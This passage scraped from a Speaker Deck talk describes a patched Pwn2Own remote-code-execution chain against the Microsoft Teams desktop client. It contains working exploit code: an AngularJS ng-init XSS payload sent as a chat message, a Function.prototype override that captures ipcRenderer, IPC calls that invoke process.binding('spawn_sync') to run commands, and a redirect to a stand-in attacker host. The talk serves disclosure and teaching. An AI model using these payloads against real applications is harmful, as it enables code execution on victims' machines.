  19. ###  [What can be said from used options new BrowserWindow({ webPreferences:](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_18.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own What can be said from used options new BrowserW...")

{ nodeIntegration: false, contextIsolation: false, sandbox: true } }); ➡ When arbitrary JS exec is possible, due to sandbox, JS can't access Node APIs which lead to RCE directly but due to the lack of context isolation, other Node APIs may be accessible. 

  20. ###  [Trying to access interesting Node APIs • When I'm trying](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_19.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Trying to access interesting Node APIs • When I...")

to get an interesting reference to exploitable Node API by overriding prototype of various built-in methods... • ipcRenderer module's reference came from overridden Function.prototype.call <script> Function.prototype._call = Function.prototype.call; Function.prototype.call = function(...args) { if (args[3] && args[3].name === "__webpack_require__") { ipc = args[3]('./lib/sandboxed_renderer/api/exports/electron.ts').ipcRenderer; } return this._call(...args); } </script>

  21. ###  [ipcRenderer module const { ipcMain } = require('electron'); [...] ipcMain.handle('test',](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_20.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own ipcRenderer module const { ipcMain } = require\(...")

(evt, msg) => { console.log(msg);//hello return 'hey'; }); <h1>Hello Electron!</h1> Main process main.js: index.html: It is used to communicate between renderer and main process const { ipcRenderer } = require('electron'); ipcRenderer.invoke('test','hello'); .then(msg=>{ console.log(msg);//hey }); preload.js: ➡Main process has full access to Node APIs, so it may lead to RCE if there is an IPC listener which doesn't have proper validation Renderer process 

  22. ###  [Given the fact so far 1 Find a way to](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_21.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Given the fact so far 1 Find a way to exec arbi...")

exec arbitrary JS, e.g.: • XSS • Redirect to arbitrary site 2 Find a part that leads to RCE, e.g.: • Find IPC listener which leads to RCE through ipcRenderer module retrieved from 1's js exec • Find exposed API which leads to RCE directly even if sandbox:true (In other words, find Electron 0-day) Now, I know the main window does not have contextIsolation and I can get ipcRenderer reference. The next thing to do is: 

  23. ###  [Bug #2 1. Lack of Context Isolation in main window](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_22.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Bug #2 1. Lack of Context Isolation in main win...")

2\. XSS via chat message 3. JS execution via PluginHost outside sandbox 

  24. ###  [Ideas to execute arbitrary JS • XSS • Redirect to](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_23.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Ideas to execute arbitrary JS • XSS • Redirect ...")

arbitrary site • The origin where the JS is executed is not important here • Because it allows interfering the part that uses Node APIs and achieving RCE if even arbitrary JS can be executed • In addition, according to the rules of Pwn2Own, it is necessary to achieve RCE without user interaction I decided to take a closer look at chat messages ➡ 

  25. ###  [Checking HTML sanitizer • The chat allows users to use](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_24.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Checking HTML sanitizer • The chat allows users...")

some HTML/CSS • It displays HTML after sanitizing both on server and client-side ➡ The sever-side sanitization is black-box, so I decided to check the client-side and try to guess the behavior 

  26. ###  [Sanitization in client-side • sanitize-html library is used https://github.com/apostrophecms/sanitize-html •](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_25.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Sanitization in client-side • sanitize-html lib...")

Examples of what is sanitized: • HTML elements/attributes allowing script exec(XSS) • CSS allowing breaking layouts Unexpectedly, checking sanitization around CSS here led to the discovery of XSS...➡ 

  27. ###  [Sanitization for class attr • I found class attr's allow-list-ish](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_26.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Sanitization for class attr • I found class att...")

string in client-side JS code: e.htmlClasses = "swift-*,ts-image*, emojione,emoticon-*,animated-emoticon-*, copy-paste-table,hljs*,language-*,zoetrope, me-email-*,quoted-reply-color-*" • Actually, these classes were not removed by server/client-side sanitization • Looks like the asterisk part works as a wildcard 

  28. ###  [Behavior of wildcard (swift-*) • Looks like anything except class](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_27.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Behavior of wildcard \(swift-*\) • Looks like any...")

attr's separator (e.g. 0x20) is included there <strong class="swift-abc">test</strong> <strong class="swift-;[]()'%">test</strong> But...due to a certain JS resource, it leads to JS exec?! ➡ It's okay because arbitrary class name is not added? 

  29. ###  [A certain JS resource = AngularJS • Teams used AngularJS](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_28.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own A certain JS resource = AngularJS • Teams used ...")

as a client-side Framework in some pages • The chat message part is one of them • These days it seems to be gradually being replaced by React Speaking of AngularJS... ➡ 

  30. ###  [XSSer ♥ AngularJS • AngularJS is very useful library for](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_29.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own XSSer ♥ AngularJS • AngularJS is very useful li...")

XSSer • Without using HTML tags, XSS is allowed via {{}} templates: • It introduces CSP bypass even if unsafe-eval is not set: <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.8.0/angular.js"></script> <div ng-app> {{constructor.constructor('alert(1)')()}} </div> <meta http-equiv=Content-Security-Policy content="script-src ajax.googleapis.com"> <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.8.0/angular.js"></script> <div ng-app> <img src=x ng-on-error=$event.target.ownerDocument.defaultView.alert(1)> </div>

  31. ###  [XSS found in the past • Actually, XSS via AngularJS](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_30.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own XSS found in the past • Actually, XSS via Angul...")

in MS Teams was found by security researchers in the past • It occurred due to a template string filter bypass by inserting a null char between {{}} {{3*333}\u0000} Details: https://github.com/oskarsve/ms-teams-rce The fact that this XSS occurs on single-page app is that probably Teams dynamically compiles user-input as AngularJS HTML (like inside ng-app attr)? I thought AngularJS XSS might still occur in other ways. When trying to find interesting features through AngularJS official doc, found this ...➡ 

  32. ###  [ngInit directive (1/2) • It is used for init process](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_31.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own ngInit directive \(1/2\) • It is used for init pr...")

before executing {{}} template • "Hello World!" is displayed from this: <html ng-app> <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.8.0/angular.js"></script> <strong ng-init="greeting='Hello'; person='World'"> {{greeting}} {{person}}! </strong> </html> <strong ng-init="constructor.constructor('alert(1)')()"></strong> This attr's value is evaluated as AngularJS expression, so JS works via: ng-init attribute is of course sanitized. But...➡ 

  33. ###  [ngInit directive (2/2) • ngInit can be used via class](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_32.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own ngInit directive \(2/2\) • ngInit can be used via...")

attr also • The following are the same: <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.8.0/angular.js"></script> <div ng-app> <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong> </div> <ANY ng-init="expression"> ... </ANY> <ANY class="ng-init: expression;"> ... </ANY> Official doc: https://docs.angularjs.org/api/ng/directive/ngInit The following code is also interpreted as AngularJS expression: ➡ JS exec via class attribute!! * ng-class, ng-style, etc. also can be used in the same way 

  34. ###  [How class directive is retrieved <strong class="ng-init:expression">aaa</strong> <strong class="aaa;ng-init:expression">aaa</strong> <strong](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_33.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own How class directive is retrieved &lt;strong class=...")

class="aaa!ng-init:expression">aaa</strong> <strong class="aaa♩♬♪ng-init:expression">aaa</strong> CLASS_DIRECTIVE_REGEXP = /(([\w-]+)(?::([^;]+))?;?)/, Retrieved by this regex： The following all classes work as ng-init directive: https://github.com/angular/angular.js/blob/47bf11ee94664367a26ed8c91b9b586d3dd420f5/src/ng/compile.js#L1384 If the swift-* wildcard's behavior is combined ... ➡ 

  35. ###  [XSS! alert() is executed when I sent next HTML as](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_34.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own XSS! alert\(\) is executed when I sent next HTML ...")

a chat message: <strong class="swift-x;ng- init:['alert(document.domain)'].forEach($root.$$childHead.$$nextSibl ing.app.$window.eval)">aaa</strong> * The reason I used a slightly strange call here instead of "constructor" which I shown in other slides is that there is a sandbox that prevents arbitrary JS exec depending on the version of AngularJS (All versions have known bypasses though). Here, direct use of "constructor" was not allowed. Reference: AngularJS sandbox bypasses list by Gareth Heyes https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs Yay! But the goal is RCE. It still continues! ➡ 

  36. ###  [What I was able to do so far • Found](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_35.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own What I was able to do so far • Found a way to a...")

a way to arbitrary JS execution • Found a way to get reference to IPCRenderer module by abusing the lack of context isolation So, the last step is to find IPC listener which does not perform input-validation correctly. When trying to find it, I noticed an interesting renderer called PluginHost...➡ 

  37. ###  [Bug #3 1. Lack of Context Isolation in main window](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_36.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Bug #3 1. Lack of Context Isolation in main win...")

2\. XSS via chat message 3. JS execution via PluginHost outside sandbox 

  38. ###  [PluginHost • Invisible renderer called PluginHost exists • Apparently a](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_37.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own PluginHost • Invisible renderer called PluginHo...")

node module called "slimcore" loaded here is being operated from the main window via IPC • Here, sandbox: false • Maybe slimcore doesn't work when sandbox:true, so this renderer exists? "C:\Users\USER\AppData\Local\Microsoft\Teams\current\Teams.ex e" --type=renderer [...] --app- path="C:\Users\USER\AppData\Local\Microsoft\Teams\current\res ources\app.asar" --no-sandbox [...] /prefetch:1 --msteams- process-type=pluginHost 

  39. ###  [How slimcore is executed • Set IPC listeners in PluginHost's](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_38.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own How slimcore is executed • Set IPC listeners in...")

preload script and execute through messages sent from main window • Main window can send message with API named sendToRendererSync which exists in the object retrieved through bug #1 • btw, this API does not exists in Electron's original ipcRenderer module, so maybe MS extended? ELECTRON_REMOTE_SERVER_REQUIRE ELECTRON_REMOTE_SERVER_MEMBER_GET ELECTRON_REMOTE_SERVER_FUNCTION_CALL There are IPC listeners named like: 

  40. ###  [What the IPC listeners do • ELECTRON_REMOTE_SERVER_REQUIRE • Call require()](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_39.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own What the IPC listeners do • ELECTRON_REMOTE_SER...")

with string specified in message • However, validation allows only allow-listed modules such as "slimcore" • ELECTRON_REMOTE_SERVER_MEMBER_GET • Perform property access using string specified in message • ELECTRON_REMOTE_SERVER_FUNCTION_CALL • Perform function call with string specified in message • (listeners for SET or other operations also exist) 

  41. ###  [It's called like this: require('slimcore').func('arg'); 1. Send ELECTRON_REMOTE_SERVER_REQUIRE 3. Send](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_40.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own It&#39;s called like this: require\(&#39;slimcore&#39;\).func...")

ELECTRON_REMOTE_SERVER_FUNCTION_CALL 2. Send ELECTRON_REMOTE_SERVER_MEMBER_GET Hm, I can smell something... ➡ 

  42. ###  [Focus on MEMBER_GET's property access ELECTRON_REMOTE_SERVER_MEMBER_GET's code： P(c.remoteServerMemberGet, (e,t,n,o)=>{ const](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_41.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Focus on MEMBER_GET&#39;s property access ELECTRON_...")

i = s.objectsRegistry.get(n); if (null == i) throw new Error(`Cannot get property '${o}' on missing remote object ${n}`); return A(e, t, ()=>i[o]) } ) variable i: acccess-target's object variable o: accessed property This property access is done without any check such as hasOwnProperty(). This means... ➡ 

  43. ###  [Object.prototype.* access is allowed require('slimcore').toString.constructor('js-code')(); 1. REQUIRE 4. FUNCTION_CALL 2.](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_42.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Object.prototype.* access is allowed require\(&#39;s...")

MEMBER_GET 3. MEMBER_GET 5. FUNCTION_CALL This allowed accessing Function() via constructor property and executing arbitrary JS! 

  44. ###  [What can I do with this JS exec? • The](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_43.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own What can I do with this JS exec? • The code is ...")

code is evaluated in the preload script's context • That means... it has access to Node API! • Additonally, sandbox:false, so no API restriction! The way to perform RCE in this context ➡ 

  45. ###  [process.binding • Something like require() used in Node.js internal •](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_44.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own process.binding • Something like require\(\) used...")

Only available when sandbox: false • In the child_process module, binding('spawn_sync') is used and by following the call here, command exec is possible: a = { "type": "pipe", "readable": 1, "writable": 1 }; b = { "file": "cmd", "args": ["/k", "start", "calc"], "stdio": [a, a] }; process.binding("spawn_sync").spawn(b); I learned this from Math.js RCE by @CapacitorSet & @denysvitali：https://jwlss.pw/mathjs/ 

  46. ###  [FYI：Can I use require()? require('slimcore') .toString.constructor("require('child_process')...")(); Why don't use require('child_process')](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_45.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own FYI：Can I use require\(\)? require\(&#39;slimcore&#39;\) .t...")

directly? This does not work. Why? ➡ 

  47. ###  [Why require does not work Because Function() creates a function](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_46.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Why require does not work Because Function\(\) cr...")

executed within global scope 1: function (exports, require, module, __filename, __dirname) { console.log(`1: ${arguments.callee.toString()}`); console.log(`2: ${eval('typeof require')}`); console.log(`3: ${constructor.constructor('typeof require')()}`); } 2: function 3: undefined console.log(`1: ${arguments.callee.toString()}`); console.log(`2: ${eval('typeof require')}`); console.log(`3: ${constructor.constructor('typeof require')()}`); ➡ Load as preload script Exists in function scope 

  48. ###  [Another way to exec command • Looks like other Pwn2Own](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_47.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Another way to exec command • Looks like other ...")

participants (@adm1nkyj1 & @jinmo123) also noticed the way to exec command via IPC • However, the last step to achive RCE is a bit different. They used eval call existing in preload scripts and called require('child_process'): Details: https://blog.pksecurity.io/2023/01/16/2022-microsoft-teams-rce.html#2- pluginhost-allows-dangerous-rpc-calls-from-any-webview function loadSlimCore(slimcoreLibPath) { let slimcore; if (utility.isWebpackRuntime()) { const slimcoreLibPathWebpack = slimcoreLibPath.replace(/\\\/g, "\\\\\\\"); slimcore = eval(`require('${slimcoreLibPathWebpack}')`); [...] } [...] } Rewrite String.prototype.replace and change return value Arbitrary string is passed here (This is direct eval call, so it is executed within this function scope and require() access is allowed) 

  49. ###  [all bugs aligned! 1. Lack of Context Isolation in main](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_48.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own all bugs aligned! 1. Lack of Context Isolation ...")

window 2. XSS via chat message 3. JS execution via PluginHost outside sandbox Let's launch calc！ ➡ 

  50. ###  [Steps to reproduce 1. Attacker creates a page containing the](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_49.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Steps to reproduce 1. Attacker creates a page c...")

following code <script> Function.prototype._call = Function.prototype.call; Function.prototype.call = function(...args) { if (args[3] && args[3].name === "__webpack_require__") { ipc = args[3]('./lib/sandboxed_renderer/api/exports/electron.ts').ipcRenderer; } return this._call(...args); } </script> JS code to send IPC follows on the next page...... <script> ... JS code to get reference of ipcRenderer module: 

  51. ###  [<script> setTimeout(function(){ ipc.invoke('calling:teams:ipc:initPluginHost',true).then((id)=>{ objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_REQUIRE',[[],'slimcore'],'')[0]['id']; objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_MEMBER_GET',[[],objid,'toString',[]],'')[0]['id']; objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_MEMBER_GET',[[],objid,'constructor',[]],'')[0]['id']; objid=ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_FUNCTION_CALL',[[],objid,[{"type":"value","value": 'a={"type":"pipe","readable":1,"writable":1};b={"file":"cmd","args":["/k","start","calc"],"stdio":[a,a]}; process.binding("spawn_sync").spawn(b);'}]],'')[0]['id']; ipc.sendToRendererSync(id,'ELECTRON_REMOTE_SERVER_FUNCTION_CALL',[[],objid,[{"type":"value","value":""}]],'');](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_50.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own &lt;script&gt; setTimeout\(function\(\){ ipc.invoke\(&#39;cal...")

}); },2000); </script> require('slimcore').toString.constructor('js-code')(); 1. REQUIRE 4. FUNCTION_CALL 2. MEMBER_GET 3. MEMBER_GET 5. FUNCTION_CALL Above code is for sending IPC to execute the following JS on PluginHost: 

  52. ###  [Steps to reproduce 2. Send the following HTML as a](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_51.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Steps to reproduce 2. Send the following HTML a...")

chat message <strong class="swift-x;ng- init:['eval(decodeURIComponent(\'setTimeout(function()%7Blocation.replace(%27//at tacker.example.com/poc.html%27)%7D,10000)\'))'].forEach($root.$$childHead.$$nextS ibling.app.$window.eval)">aaa</strong>

  53. ###  [Steps to reproduce The final code executed by eval is](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_52.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Steps to reproduce The final code executed by e...")

the following. It just navigates to attacker's site: setTimeout(function(){ location.replace('//attacker.example.com/poc.html'); },10000); Page created at step 1 (* No need to use setTimeout. I used it for clarity of demo.) 

  54. ###  [Steps to reproduce 3. Victim opens the message (XSS is](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_53.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Steps to reproduce 3. Victim opens the message ...")

triggered) 

  55. ###  [Steps to reproduce After a while, a navigation to the](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_54.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Steps to reproduce After a while, a navigation ...")

crafted page happens (https://attacker.example.com/poc.html) 

  56. ###  [Steps to reproduce Suddenly calc is executed!!! (https://attacker.example.com/poc.html) DEMO: https://youtu.be/TMh_WbF9VnM](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_55.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Steps to reproduce Suddenly calc is executed!!!...")

  57. ###  [All bugs were fixed • contextIsolation: Enabled in main window](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_56.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own All bugs were fixed • contextIsolation: Enabled...")

now • XSS: Allowed only limited characters in the wildcard part • PluginHost: Applied web page's CSP to preload scripts • For this, contextIsolation on PluginHost was disabled. By doing so, looks like web page's CSP is applied to preload scripts and eval is disabled. hmm.. • btw, apparently latest Electron(tested on v25+) does not allow "eval" in preload scripts (Teams doesn't use the latest though) • "Uncaught EvalError: Code generation from strings disallowed for this context" 

  58. ###  [That's all • Next, your turn!](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_57.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own That&#39;s all • Next, your turn!")

  59. ###  [Thanks!! @kinugawamasato](https://files.speakerdeck.com/presentations/822da490117b42cd8a19bc8e2588305e/slide_58.jpg "How I Hacked Microsoft Teams and got $150,000 in Pwn2Own Thanks!! @kinugawamasato")

![](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg)

[ ![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg) SpeakerDeck ](/) [](https://www.facebook.com/speakerdeck "SpeakerDeck on Facebook") [](https://x.com/speakerdeck "SpeakerDeck on Twitter")

## Top Categories

  * [Programming](/c/programming)
  * [Technology](/c/technology)
  * [Storyboards](/c/storyboards)
  * [Featured decks](/p/featured)
  * [Featured speakers](/s/featured)

## Use Cases

  * [Storyboard Artists](/pro/storyboard-artists)
  * [Educators](/educators)
  * [Students](/student-pricing)

## Resources

  * [Help Center](https://help.speakerdeck.com/)
  * [Blog](https://blog.speakerdeck.com/)
  * [Compare Speaker Deck](/slideshare-alternative)
  * [Advertising](/advertising)

## Features

  * [Private URLs](/features/privacy-controls)
  * [Password Protection](/features/password-protection)
  * [Custom URLS](/features/custom-urls)
  * [Scheduled publishing](/features/scheduled-publishing)
  * [Remove Branding](/features/remove-branding)
  * [Restrict embedding](/features/restrict-embedding)
  * [Notes](/features/slide-notes)

Copyright © 2026 Speaker Deck, LLC.

All slide content and descriptions are owned by their creators.

  * [About](/about)
  * [Terms](/tos)
  * [Privacy](/privacy)
  * [DMCA](/dmca)
  * [Accessibility Statement](/accessibility)
